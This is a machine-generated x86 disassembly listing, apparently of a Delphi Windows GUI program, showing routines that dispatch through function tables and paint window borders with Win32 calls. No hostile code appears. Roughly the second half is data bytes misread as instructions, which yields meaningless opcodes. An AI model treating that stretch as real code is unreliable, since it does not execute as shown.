mov edx [ r-xdata ]
call sub_404920
mov eax rw-data
mov edx [ r-xdata ]
call sub_404920
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_43c780
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
call sub_42df00
mov [ esi + 0x5 ] al
call sub_43a704
cmp eax 0x60000
setge al
mov [ esi + 0x4 ] al
mov eax esi
call sub_43d0f8
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_43c7cc
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov eax esi
call sub_43c86c
call sub_42dd40
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403118
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_43c800
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp [ esi + 0x6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ esi + eax * 4 + 0x8 ]
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al bl
cmp [ esi + eax * 4 + 0x8 ] 0x0
jne r-xdata
mov edi ebx
and edi 0x7f
mov eax [ edi * 4 + rw-data ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ esi + edi * 4 + 0x8 ] eax
sub_43c86c
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
inc ebx
cmp bl 0x18
jne r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
xor eax eax
mov [ esi + edi * 4 + 0x8 ] eax
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_43c8b0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_43c800
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43c900
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_43c800
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_43c94c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_43c800
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43c990
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_43c800
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_43c9d8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp + 0x10 ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov al 0x1
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov dl [ ebx ]
mov eax esi
call sub_43c800
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
test al al
je r-xdata
sub_43ca40
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov ebx eax
mov esi [ ebp + 0x14 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax esi
call sub_404730
push eax
mov eax esi
call sub_404720
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push edi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_43c800
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_43caa4
mov [ ecx ] 0x0
xor eax eax
mov al dl
cmp eax 0xf
jge r-xdata
add eax 0xfffffff1
sub eax 0xc
jb r-xdata
add eax 0xfffffffe
sub eax 0x5
jb r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xf
jmp r-xdata
sub eax 0x2
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub eax 0x8
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x4
mov eax 0x1b
jmp r-xdata
je r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x7
jmp r-xdata
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0x1d
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_43cb28
mov [ ecx ] 0x3
mov eax edx
add al 0xfe
sub al 0x7
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
je r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x2
mov eax 0x9
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_43cb64
mov [ ecx ] 0x12
xor eax eax
mov al dl
cmp eax 0x14
jge r-xdata
add eax 0xffffffec
sub eax 0x6
jb r-xdata
add eax 0xfffffffe
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0x14
jmp r-xdata
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub eax 0x6
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x5
mov eax 0x1a
jmp r-xdata
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x8
jmp r-xdata
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x20
jmp r-xdata
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xe
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_43cc00
mov [ ecx ] 0x17
xor eax eax
mov al dl
cmp eax 0x68
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
mov al [ eax + lookup_table_43cc1d ]
jmp [ eax * 4 + jump_table_43cc86 ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x5
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x8
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0xb
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0xe
jmp r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x11
jmp r-xdata
mov [ ecx + 0x4 ] 0x7
mov eax 0x14
jmp r-xdata
mov [ ecx + 0x4 ] 0x8
mov eax 0x16
jmp r-xdata
mov [ ecx + 0x4 ] 0x9
mov eax 0x18
jmp r-xdata
mov [ ecx + 0x4 ] 0xa
mov eax 0x1a
jmp r-xdata
mov [ ecx + 0x4 ] 0xb
mov eax 0x1c
jmp r-xdata
mov [ ecx + 0x4 ] 0xc
mov eax 0x1e
jmp r-xdata
mov [ ecx + 0x4 ] 0xd
mov eax 0x20
jmp r-xdata
mov [ ecx + 0x4 ] 0xe
mov eax 0x24
jmp r-xdata
mov [ ecx + 0x4 ] 0xf
mov eax 0x28
jmp r-xdata
mov [ ecx + 0x4 ] 0x10
mov eax 0x2c
jmp r-xdata
mov [ ecx + 0x4 ] 0x11
mov eax 0x30
jmp r-xdata
mov [ ecx + 0x4 ] 0x12
mov eax 0x34
jmp r-xdata
mov [ ecx + 0x4 ] 0x13
mov eax 0x38
jmp r-xdata
mov [ ecx + 0x4 ] 0x14
mov eax 0x3c
jmp r-xdata
mov [ ecx + 0x4 ] 0x15
mov eax 0x40
jmp r-xdata
mov [ ecx + 0x4 ] 0x16
mov eax 0x44
jmp r-xdata
mov [ ecx + 0x4 ] 0x17
mov eax 0x48
jmp r-xdata
mov [ ecx + 0x4 ] 0x18
mov eax 0x4c
jmp r-xdata
mov [ ecx + 0x4 ] 0x19
mov eax 0x50
jmp r-xdata
mov [ ecx + 0x4 ] 0x1a
mov eax 0x54
jmp r-xdata
mov [ ecx + 0x4 ] 0x1b
mov eax 0x58
jmp r-xdata
mov [ ecx + 0x4 ] 0x1c
mov eax 0x5c
jmp r-xdata
mov [ ecx + 0x4 ] 0x1d
mov eax 0x60
jmp r-xdata
mov [ ecx + 0x4 ] 0x1e
mov eax 0x61
jmp r-xdata
mov [ ecx + 0x4 ] 0x1f
mov eax 0x62
jmp r-xdata
mov [ ecx + 0x4 ] 0x20
mov eax 0x63
jmp r-xdata
mov [ ecx + 0x4 ] 0x21
mov eax 0x64
jmp r-xdata
mov [ ecx + 0x4 ] 0x22
mov eax 0x65
jmp r-xdata
mov [ ecx + 0x4 ] 0x23
mov eax 0x66
jmp r-xdata
mov [ ecx + 0x4 ] 0x24
mov eax 0x67
jmp r-xdata
mov [ ecx + 0x4 ] 0x25
mov eax 0x68
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_43cf8c
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
push 0xffffffec
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
call GetWindowRect
mov eax [ ebp - 0x24 ]
neg eax
push eax
mov eax [ ebp - 0x28 ]
neg eax
push eax
lea eax [ ebp - 0x28 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_43d0e7
push [ fs : edx ]
mov [ fs : edx ] esp
push esi
lea esi [ ebp - 0x28 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
test bl bl
je r-xdata
mov eax [ ebp - 0x1c ]
sub eax 0x2
push eax
mov eax [ ebp - 0x20 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x24 ]
add eax 0x2
push eax
mov eax [ ebp - 0x28 ]
add eax 0x2
push eax
mov eax [ ebp - 0x8 ]
push eax
call ExcludeClipRect
lea ecx [ ebp - 0x34 ]
mov dl 0x2
mov eax esi
call sub_43cb28
lea eax [ ebp - 0x28 ]
push eax
push 0x0
lea ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_43c94c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
call ReleaseDC
retn
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_44f7d8
push eax
call GetWindowLongA
test eax 0x100000
je r-xdata
test eax 0x200000
je r-xdata
push 0x2
call GetSystemMetrics
mov edi eax
push 0x3
call GetSystemMetrics
mov ebx eax
push 0xfffffffe
push 0xfffffffe
lea eax [ ebp - 0x18 ]
push eax
call InflateRect
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x44 ]
push eax
mov edx [ ebp - 0xc ]
sub edx ebx
mov eax [ ebp - 0x10 ]
sub eax edi
mov ecx [ ebp - 0x10 ]
call sub_4170c4
push esi
lea esi [ ebp - 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push 0xf
call GetSysColorBrush
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call FillRect
sub_43d114
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43d14f
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d156
retn
mov eax [ rw-data ]
call sub_403128
mov eax rw-data
call sub_403eb8
sub_43d6c3
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc eax 0x72440800
popad
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
inc [ eax ]
mov al 0x44
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push ss
add [ edi ] al
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
pop esp
push edx
inc esp
add [ eax + 0x1 ] ch
add bh bh
clc
add al [ eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x460c0017 ] al
outsd
arpl [ ebp + 0x73 ] si
inc ebx
outsd
outsb
je r-xdata
inc eax
add [ ecx ] bl
add bh bh
fcom [ eax + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
sbb eax [ eax ]
or dl [ eax + 0x61 ]
jb r-xdata
outsd
insb
call 0x68441952
add [ eax ] al
jmp [ eax - 0x4fffbb70 ]
add [ eax + 0x1 ] al
outsb
je r-xdata
adc [ eax ] al
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
add [ eax ] al
and eax [ eax ]
or [ edi + 0x6f ] dl
jb r-xdata
outsb
jae r-xdata
je r-xdata
jo r-xdata
adc [ eax ] al
0x20ff0000 0x4491
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al 0x0
push cs
push eax
popad
jb r-xdata
add [ eax ] al
and [ esi ] 0x0
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe942d955
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0027 ] al
outsb
inc esp
jb r-xdata
push edi
add [ eax ] eax
jmp [ eax ]
popad
jb r-xdata
or [ ebx + 0x68 ] dl
outsd
ja r-xdata
rol [ ebx ] cl
outsb
add [ eax ] eax
[ ebx + eax + 0x44 ]
je r-xdata
outsb
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001f ] al
push 0x6948776f
outsb
outsb
je r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esp
jb r-xdata
jo r-xdata
jb r-xdata
outsb
jne r-xdata
in al dx
add al [ eax + eax + 0x28 ]
add eax [ eax + eax - 0x78 ]
add [ eax ] eax
inc [ eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x540b0020 ] al
jb r-xdata
imul ebp [ esi + 0x74 ] r-xdata
adc [ eax ] al
jo r-xdata
inc eax
add [ ecx - 0x3010000 ] bl
nop
inc esp
add ah al
nop
inc esp
add [ eax ] dl
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
add [ eax + 0x4f09002d ] al
outsb
dec ebp
outsd
jne r-xdata
inc eax
inc eax
inc esp
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jo r-xdata
outsd
add [ eax ] eax
dec [ eax + 0x1004403 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
pop eax
inc ecx
add [ eax ] ah
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0025 ] al
outsb
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
int3
push ds
add [ 0x776f6853 ] cl
inc ecx
arpl [ ebx + 0x65 ] sp
insb
inc ebx
push 0x10007261
dec [ ebx + eax ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add bh bh
or al 0x3
add [ eax ] eax
mov eax [ ebp ]
jl r-xdata
inc esp
outsd
arpl [ ebx - 0x74 ] bp
inc edx
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0031 ] al
outsb
push ebp
jo r-xdata
je r-xdata
inc esp
outsd
ja r-xdata
inc ebx
outsd
outsb
je r-xdata
and eax 0x6e4f0e00
inc ecx
inc esp
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0028 ] al
outsb
inc esp
jb r-xdata
add [ eax ] al
js r-xdata
jo r-xdata
add bh bh
pop [ fs : eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5009001d ] al
outsd
add [ esp + ebx * 8 + 0x43 ] ch
jb r-xdata
add [ eax ] al
jmp eax
pop eax
inc ecx
add [ eax - 0x7f00ffff ] al
add [ eax ] eax
push ebx
je r-xdata
xor [ ecx ] 0x0
or ecx [ edi + 0x6e ]
jb r-xdata
mov eax 0xd8004440
add [ eax ] al
add [ eax + 0x4f0b002b ] al
add [ eax ] al
dec edi
jbe r-xdata
aam 0x42
push eax
outsd
jo r-xdata
inc ebx
add [ eax ] ah
add al [ eax ]
add [ ebx + ebx * 8 ] dh
inc ebx
add [ esp + edx + 0x337c0042 ] bh
inc eax
add ah bh
or eax 0x33840042
inc eax
add ah dl
je r-xdata
and [ edx ] al
add [ eax ] al
test al 0x4e
inc esp
jb r-xdata
inc ebp
outsb
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002e ] al
outsb
dec ebp
outsd
jne r-xdata
add [ ecx ] 0x0
pop eax
inc ecx
add [ eax + 0x1 ] bh
add bh bh
js r-xdata
outsb
dec ebp
outsd
jne r-xdata
jb r-xdata
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090029 ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x2c ] bp
inc edx
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
add bh bh
adc [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
fld [ ebx ]
test al 0xdc
inc ebx
add [ ecx ] al
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
and al 0xde
insd
inc ebp
imul esi [ fs : ebx + ecx * 4 - 0x40 ] r-xdata
pop es
or edx [ ebx + eax * 2 + 0x75 ]
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x9a0043dc
fadd [ ebx ]
add [ eax ] al
in al dx
fiadd [ ebx ]
add ecx [ 0x69644554 ]
je r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002f ] al
outsb
dec ebp
outsd
jne r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ edi + ecx * 2 ] cl
popad
inc esp
add [ eax ] cl
inc edx
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop eax
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
outsb
outsb
jb r-xdata
push ebx
insb
arpl [ gs : eax + eax + 0x10 ] si
inc eax
add [ edi ] cl
add al [ eax ]
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push cs
add [ eax ] cl
inc ecx
jne r-xdata
bound eax [ ecx ]
add bh bh
xor [ 0x10045 ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xf ] al
str [ edx ]
inc edx
jbe r-xdata
insb
jae r-xdata
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] ch
mov dh 0x44
add al dh
add al [ ebp ]
sbb bl cl
inc esp
add [ ecx * 4 - 0x4f5fffbf ] dl
inc esp
add [ esp + eax * 4 + 0x44 ] dl
add ah cl
mov bh 0x44
add [ ebp + ecx * 4 + 0x14d40044 ] dl
inc edx
add [ eax - 0x5fffbdef ] ch
adc [ edx ] eax
fcom [ edx + eax * 2 ]
add al bh
add al 0x44
add [ esi + edi * 8 ] al
inc esp
add [ eax ] ah
add eax [ ebp ]
insb
add al [ ebp ]
enter 0x4482 0x0
cmp al 0x44
add [ eax - 0x47ffbb08 ] ah
cmc
inc esp
add [ eax ] dl
add [ eax + eax + 0x14 ] 0x82
inc esp
add [ eax - 0x4e ] dh
inc esp
add [ edx + esi * 4 + 0x5c00044 ] bl
inc esp
add [ ebx + eax * 4 - 0x70f7ffbc ] cl
inc esp
add [ eax - 0x6bffbb72 ] al
xchg ecx eax
inc esp
add [ eax - 0x70 ] al
inc esp
add ah ch
rol [ eax + eax + 0x20 ] 0x1
mov bl 0x44
add [ esi + esi * 8 ] cl
inc esp
add al cl
test [ eax + eax - 0x3c ] 0xf1
inc esp
add [ esi + esi * 8 - 0x47bbffbc ] ch
inc esp
add al bl
mov esi 0xcc780044
inc esp
add al ah
or [ eax + eax - 0x64 ] eax
or al [ eax + eax + 0xc ]
or eax [ eax + eax + 0x10 ]
int 0x44
add [ ecx * 8 - 0x3433ffbc ] dl
inc esp
add [ eax - 0x13ffbbf5 ] dh
test [ eax + eax - 0x44 ] 0xc00044d5
or [ ebp ] eax
push 0x580044f4
test [ eax + eax - 0x60 ] 0xdc004405
pop es
inc esp
add [ eax + 0x44004407 ] bl
or [ eax + eax + 0xc ] eax
or [ eax + eax - 0x44 ] al
pop es
inc esp
add [ eax + 0x8 ] dh
inc esp
add [ eax + 0x5004408 ] ch
push esp
inc ebp
imul esi [ fs : ebx + ecx * 4 - 0x40 ] r-xdata
pop es
add eax 0x69644554
je r-xdata
add [ ebx + esi + 0xcd40040 ] al
inc esp
outsd
insd
inc ebp
imul esi [ fs : eax + eax * 4 - 0x25 ] 0x525c0043
inc esp
add [ eax + eax ] cl
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x61437261
jae r-xdata
arpl [ gs : esi + 0x6f ] cx
dec esp
popad
jbe r-xdata
add [ eax ] al
add [ ecx ] dl
add [ ecx ] cl
inc edx
jbe r-xdata
dec esi
inc esp
add [ ebp + 0x1 ] ah
add bh bh
pushad
add eax 0x10045
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] eax
or [ edx + 0x65 ] eax
jbe r-xdata
dec ebp
inc esp
add [ ecx + eax ] ah
outsd
push ebx
imul edi [ edx + 0x65 ] r-xdata
add [ eax ] al
adc al [ eax ]
or al [ edx + 0x65 ]
jbe r-xdata
insb
inc ebp
jae r-xdata
or eax 0x75410a00
je r-xdata
add [ ecx ] 0x0
add [ eax ] al
add ah bl
inc esp
add [ ecx ] ah
add bh bh
fadd [ edx - 0x7c8bffbc ]
inc esp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
insb
jae r-xdata
or eax 0x33840042
inc eax
add ah dl
or al 0x44
add al al
xor [ eax ] al
fdiv [ eax ]
inc eax
add [ eax ] ch
mov dh 0x44
add al dh
add al [ ebp ]
sbb bl cl
inc esp
mov esp 0x7c004214
xor eax [ eax ]
cld
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ edx ] al
sub [ esi + 0x2f00044 ] dh
popad
insb
or esp [ ebp + 0x63 ]
push ebp
jo r-xdata
add [ eax ] al
add al ch
fiadd [ ebx ]
or [ ebp + 0x63 ] ah
dec esi
outsd
xchg esp eax
inc esp
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0030 ] al
outsb
push ebx
je r-xdata
adc al 0x0
or eax [ edx + 0x6f ]
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
add [ fs : eax ] eax
add [ eax ] al
adc eax 0x68430800
popad
jb r-xdata
insb
dec edi
jne r-xdata
add [ edi ] bl
add bh bh
jo r-xdata
dec ebp
inc esp
add [ ebx + 0x1 ] ah
add bh bh
in al dx
add al 0x45
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] dl
add [ edx ] cl
inc edx
jbe r-xdata
add [ eax ] dl
inc eax
add [ eax ] dl
add al [ eax ]
call [ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
inc eax
add [ ecx + eax - 0x5f30100 ] ah
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ eax ] al
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
dec [ edx + edi * 8 ]
add [ ecx * 4 - 0x4f5fffbf ] dl
jb r-xdata
or esp [ ebp + 0x63 ]
dec esp
outsd
ja r-xdata
jb r-xdata
or eax [ ebx + 0x6f ]
jb r-xdata
jb r-xdata
popad
jae r-xdata
add bh bh
dec esp
xchg ecx eax
inc esp
add [ eax - 0x6f ] ch
inc esp
add [ eax ] al
add [ eax ] al
add [ 0x16ff0000 ] 0x0
add eax 0x6f6c6f43
jb r-xdata
jb r-xdata
add dh bh
rcl [ eax + 0x44 ] 0x1
add [ eax - 0x80000000 ] al
adc eax [ eax ]
or [ edx + 0x69 ] al
inc esp
imul ecx [ ebp + 0x6f ] 0xea7c6564
inc ebp
add [ edx + eax ] cl
add bh bh
aam 0x5
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ eax + 0x42080013 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x7c65646f
0x20c0045 0xff00
insb
dec ecx
